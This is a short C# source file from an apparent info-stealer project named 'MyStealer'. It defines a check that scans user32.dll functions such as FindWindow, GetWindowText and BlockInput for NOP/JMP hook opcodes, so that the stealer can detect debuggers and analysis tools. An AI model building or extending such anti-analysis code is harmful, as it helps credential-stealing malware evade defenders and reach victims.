using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MyStealer.AntiDebug.Check.AntiAntiAntiDebug
{
    internal class User32Check : HookCheckBase
    {
        public override string Name => "Hooking: user32";

        protected override string ModuleName => "user32.dll";

        protected override string[] ProcNames => new string[]
        {
            "FindWindowW",
            "FindWindowA",
            "FindWindowExW",
            "FindWindowExA",
            "GetForegroundWindow",
            "GetWindowTextLengthA",
            "GetWindowTextA",
            "BlockInput"
        };

        protected override byte[] BadOpCodes => new byte[] { 0x90, 0xE9 };
    }
}
